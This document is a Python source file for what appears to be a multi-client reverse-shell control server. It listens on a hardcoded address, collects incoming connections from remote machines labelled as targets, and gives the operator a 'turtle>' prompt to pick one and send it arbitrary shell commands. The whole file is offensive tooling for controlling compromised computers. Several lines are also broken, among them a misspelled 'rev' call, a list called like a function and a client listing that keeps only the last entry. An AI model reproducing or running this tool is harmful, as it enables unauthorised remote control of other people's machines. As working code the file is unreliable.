import socket
import sys
import time
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_address = []


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.29.93"
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)  # prevents timeout from happening

            all_connections.append(conn)
            all_address.append(addr)

            print("Connection has been established :" + addr[0] + "pir")

        except:
            print("Error accepting connections")


# 2nd thread functions -1) see all the clients 2) Select a client 3) send commands to the connected clents
# Interactive prompt for sending commands
# turtle> list
# 1 Friend-A Port
# 2 Friend-B Port
# 3 Friend-C Port
# turtle> Select 1

def start_turtle():

    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

            else:
                print("command not recognized")


# display all current active connections with client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):

        try:
            conn.send(str.encode(' '))
            conn.rev(201480)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = str(1) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"

    print("----Clients----" + "\n" + results)


# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections(target)
        print("You are now connected to :" + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn
        # 1192.168.0.4

    except:
        print("Selection not valid")
        return None


# Send commands to the target computer
def send_target_commands(conn):
    while True:
        try:
            while 1:
                cmd = input()
                if cmd == 'quit':
                    break
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480), "utf-8")
                    print(client_response, end="")

        except:
            print("error sending commands")
            break


# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True  # set this to end the thread when the program ends
        t.start()


# Do next job that is in the queue( handle connections, send commands after conn)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()

        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()
